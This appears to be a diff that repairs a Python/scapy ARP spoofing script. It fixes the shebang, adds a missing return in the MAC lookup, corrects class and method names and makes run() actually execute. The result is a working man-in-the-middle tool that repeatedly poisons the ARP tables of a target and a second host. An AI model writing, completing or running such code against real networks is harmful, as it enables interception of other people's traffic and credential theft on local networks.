@@ -1,4 +1,4 @@
-#!/usr/bin/bash
+#!/usr/bin/python
 
 import scapy.all as scapy
 import argparse
@@ -19,20 +19,21 @@ class ARPSpoofer:
         request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         final_packet = broadcast / request
-        answer = scapy.srp(final_packet, iface=self.interface, timeout =1, verbose=False)[0]
+        answer = scapy.srp(final_packet, iface=self.interface, timeout =2, verbose=False)[0]
         mac = answer[0][1].hwsrc
+        return mac
 
     def spoof_target(self, target, spoofed):
         # Spoofs target through acting as the spoofed IP address
-        mac = self.get_mac(target)
+        mac = self.grab_mac(target)
         packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
         scapy.send(packet, iface=self.interface, verbose=False)
         print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")
 
     def restore(self, dest_ip, source_ip):
         # Restores the ARP table of target machine to original state.
-        dest_mac = self.get_mac(dest_ip)
-        source_mac = self.get_mac(source_ip)
+        dest_mac = self.grab_mac(dest_ip)
+        source_mac = self.grab_mac(source_ip)
         packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, iface=self.interface, verbose=False)
         print(Fore.GREEN + f"[+] Restoring {dest_ip} to original state.")
@@ -42,8 +43,8 @@ class ARPSpoofer:
         # Upon interruption ARP table is restored (Ctrl+C)
         try:
             while True:
-                self.spoof(self.target_ip, self.spoof_ip) # Spoof IP of target
-                self.spoof(self.spoof_ip, self.target_ip) # Spoofing the spoofed IP
+                self.spoof_target(self.target_ip, self.spoof_ip) # Spoof IP of target
+                self.spoof_target(self.spoof_ip, self.target_ip) # Spoofing the spoofed IP
         except KeyboardInterrupt:
             print(Fore.RED + "[!] Detected cancellation. Restoring APR tables... Please be patient")
             self.restore(self.target_ip, self.spoof_ip)
@@ -61,8 +62,8 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     # Create ARP Spoofer object and start the spoofing process
-    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)
-    spoofer.run
+    spoofer = ARPSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)
+    spoofer.run()
 
 
 
